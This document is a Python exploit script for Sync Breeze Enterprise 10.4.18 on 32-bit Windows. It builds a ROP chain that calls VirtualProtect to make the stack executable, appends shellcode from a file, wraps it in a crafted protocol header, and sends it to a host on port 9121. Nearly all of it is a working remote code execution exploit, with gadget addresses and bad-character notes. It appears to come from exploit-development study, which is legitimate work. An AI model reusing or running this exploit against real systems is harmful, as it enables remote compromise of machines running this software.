# !/home/kali/SBEExploit
# Exploit code for Sync Breeze Enterprise 10.4.18 on Windows 10-32 bit app.
# With reference from:
# https://medium.com/@vikrant.navalgund/sync-breeze-enterprise-windows-exploit-dev-for-the-curious-d6c1732d81a0
# Ng Tze Henn (Superbestron)

from pwn import *

max_buffer = 0x400
nop_dword = 0x90909090
pattern = util.cyclic.cyclic_metasploit(max_buffer)
deref_offset = util.cyclic.cyclic_metasploit_find(0x63413163)
eip_offset = util.cyclic.cyclic_metasploit_find(0x33654132)
rop_start = deref_offset - 0x10 # We found out this by looking into the memory

# Generic read bytes from FILE
def shellcode():
     with open("./payload.bin", "rb") as f:
          return f.read()

# ROP gadgets
rop_nop = 0x1005f11b # ret 0;
pop_pop_ret = 0x10137dd3 # pop ebp; pop ebx; ret
pivot_addr = 0x1010f455 # add esp, 0x654; ret 4 - stack_pivot
pop_eax_ret = 0x100fd644
pop_esi_ret = 0x10043073
pop_edi_ret = 0x10064def
pop_ecx_ret = 0x10043c28
sar_edx_8 = 0x10142fa2 # mucks [ecx]
pop_edx_ret = 0x10130ed1 # mucks eax - al to be specific
push_esp_ret = 0x100bc9e5
pop_ebp_ret = 0x1005edc5
pop_eax_ret_4= 0x1009fb3a
pushad_ret = 0x10151192
inc_ebx_pop_esi_ret = 0x10154357

mov_esi_ptr_eax = 0x10138850 # mov esi, dword ptr [eax]; push eax; call edi;
sub_eax_ebp_pppr = 0x1014e1a8 # sub eax, ebp; pop esi; pop ebp; pop ebx; ret
mov_eax_ptr_eax_ret = 0x1014fc8c # mov eax, dword ptr [eax]; ret; - libspp
get_iat_addr_ref_func = 0x1016a044 # KERNEL32!WriteFile - use a pivot to find VirtualProtect Func.
random_writable_addr = 0x1020f004 # Random writable addr in one of the non-dynamic base modules

# Start constructing the body...
body = 'A' * rop_start
body += p32(rop_nop) * 3 #'XXXX' # ROP chain beginning
body += p32(pop_eax_ret)
body += 'DDDD' # access_violation
body += p32(rop_nop) * 14 # 15 (eip_offset - len(body)/4)
body += p32(pop_eax_ret_4)
body += p32(pivot_addr) # eip_offset
body += p32(rop_nop) * 2

# - - Notes - -
# We will use the VirtualProtect API to change
# the STACK permissions to Execute. Our shellcode
# will already be present on the STACK and once
# VirtualProtect is successful, the magic should
# happen.

# 0x75db4f50 - KERNEL32!VirtualProtect
# 0x1016a044 - libspp - KERNEL32!WriteFile(0x75dbc6d0)

# Bad characters: \x00, \x01, \x02 (delimiter), \x03, \x0a (newline)

# WHY I chose 0x80013bc0 and 0x7fff3bc0: 
# Using 0x00007800 will give me null bytes
# so I used 0x100000000 + 0x7800 = 0x100007800
# 100007800 / 0x2 = 0x80003bc0 (but this has null bytes)
# So I +/- 0x10000 to get 0x80013bc0 and 0x7fff3bc0
# Following the sub eax, ebp instruction below
# 0x75dbc6d0 - (0x80013bc0 + 0x7fff3bc0) = 0x75dbc6d0 - 0x100007800
# = 0x75db4f50

# VirtualProtect parameters

# eax - nop_dword '90909090'
# ecx - lpOldProtect (ptr to Writable address)
# edx - NewProtect (0x40)
# ebx - dwSize - '1 or 2 - denotes the pages, but if you can't then > 0 should be OK'
# esp - lpAddress (automatic)
# ebp - ReturnTo (ptr to jump esp)
# esi - ptr to VirtualProtect()
# edi - ropnop

# Setup the ecx REG temporarily
# Because the setup edx rop needs ecx to be a Writable address
body += p32(pop_ecx_ret)
body += p32(random_writable_addr)

# setup the edx REG
body += p32(pop_edx_ret)
body += p32(0x40404040)
body += p32(sar_edx_8)
body += p32(sar_edx_8)
body += p32(sar_edx_8)

# Setup the ecx REG
body += p32(pop_ecx_ret)
body += p32(random_writable_addr)

# Setup ebx REG
body += p32(inc_ebx_pop_esi_ret)
body += p32(rop_nop)

# Setup the esi REG - this one was painful ... :)
body += p32(pop_eax_ret)
body += p32(get_iat_addr_ref_func)
body += p32(mov_eax_ptr_eax_ret) #0x1014fc8c
body += p32(pop_ebp_ret) #1005edc5
# See above for explanation of 0x80013bc0 and 0x7fff3bc0
body += p32(0x80013bc0)
body += p32(sub_eax_ebp_pppr) #0x1014e1a8
body += p32(nop_dword)
body += p32(0x7fff3bc0)
body += p32(nop_dword)
body += p32(sub_eax_ebp_pppr)
body += p32(nop_dword)
body += p32(nop_dword)
body += p32(nop_dword)
body += p32(pop_edi_ret)
body += p32(0x1004d9d6) # pop ebp; pop ebx; add esp, 8; ret; 
body += p32(0x10134363) # mov esi, eax; mov eax, dword ptr [esp + 0x10], push 0xff, push eax; push esi; call edi;
# After this instruction, it will run instructions at 0x1004d9d6
# pop ebp
# pop ebx
# add esp, 8
# ret

# Setup ebp REG
body += p32(pop_ebp_ret) 
body += p32(push_esp_ret) # This instruction is not executed, but placed in ebp

# Setup eax REG
body += p32(pop_eax_ret)
body += p32(nop_dword) # eax = 90909090

# Setup edi REG
body += p32(pop_edi_ret) # 0x10064def
body += p32(rop_nop) # 0x1005f11b into edi 

# Call pushad - the magic to create a fake stack frame
body += p32(pushad_ret) # 0x10151192
body += shellcode() # z shell code :) :)
body += 'A' * (max_buffer - len(body))

# Header values
header = p32(0xabba1975) # Magic HDR
header +=p32(0x3) # Some kinda control command
header +=p32(0x1) # Dont use encryption

# Default values
# header +=p32(0x1a) # Payload offset position for delimiter
# header +=p32(0x20) # Payload size
# header +=p32(0x00) # Payload delimiter

# Fuzzed values
header +=p32(0x400) # Payload offset position for delimiter
header +=p32(0x400) # Payload size
header +=p32(ord(body[-1])) # Payload delimiter

# Default Payload
# body = 'SERVER_GET_INFO'
# body +='\x02\x32\x01'
# body +='Data'
# body +='\x01\x30\x01\x00\x24\x72\x88\x49\x60\x02'

# Our Payload
payload = header + body

conn = remote('172.16.150.134', 9121)
conn.send(payload)

#response = conn.recv(1024)
conn.close()
